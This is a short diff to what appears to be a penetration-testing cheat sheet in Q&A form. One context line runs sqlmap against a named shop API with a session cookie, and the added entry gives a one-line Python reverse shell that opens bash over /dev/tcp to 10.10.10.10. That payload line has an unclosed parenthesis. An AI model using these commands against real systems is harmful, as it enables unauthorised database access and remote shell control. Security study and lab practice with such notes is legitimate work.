@@ -9,3 +9,7 @@ sqlmap -u http://shop.wey-tech.com/account_api.php --cookie="session=c2deb0aa8a2
 ### You have a gzip compressed data file that doesn't gunzip?
 Try `zless` or `zcat`.
 
+### What is a python payload for a reverse shell?
+```
+import os; os.system('/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.10.10/8080 0>&1\"'
+```
